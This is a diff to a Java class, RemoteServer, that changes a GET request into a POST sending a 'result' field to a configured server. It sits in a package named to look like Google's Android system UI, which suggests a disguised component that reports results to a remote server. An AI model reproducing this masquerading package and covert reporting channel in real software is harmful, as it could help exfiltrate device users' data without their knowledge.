@@ -1,8 +1,7 @@
 package com.google.android.systemUi.helper;
-import org.apache.http.client.*;
-import org.apache.http.impl.client.*;
-import java.net.*;
 import java.io.*;
+import java.net.*;
+import java.util.*;
 
 public class RemoteServer
 {
@@ -13,23 +12,28 @@ public class RemoteServer
 		this.mConnection = serverUri;
 	}
 
-	public String connect(String extra) throws IOException
+	public String connect(String result) throws IOException
 	{
 		String reserved = this.mConnection;
-		
-		if (extra != null)
-			reserved = String.format(reserved, extra);
-		
 		URL url = new URL(reserved);
 		HttpURLConnection connection = (HttpURLConnection)url.openConnection();
-
-		connection.setRequestMethod("GET");
-
+		StringBuilder postData = new StringBuilder();
+		
+		connection.setDoOutput(true);
+		connection.setRequestMethod("POST");
+		
+		if (result != null)
+			postData.append("result=" + URLEncoder.encode(result, "UTF-8"));
+		
+		DataOutputStream oS = new DataOutputStream(connection.getOutputStream());
+		
+		oS.writeBytes(postData.toString());
+		oS.flush();
+		oS.close();
+		
 		if (connection.getResponseCode() != HttpURLConnection.HTTP_OK)
 			throw new IOException("HTTP connection error: " + getURL());
-
-		connection.connect();
-
+		
 		BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
 		StringBuilder builder = new StringBuilder();
 
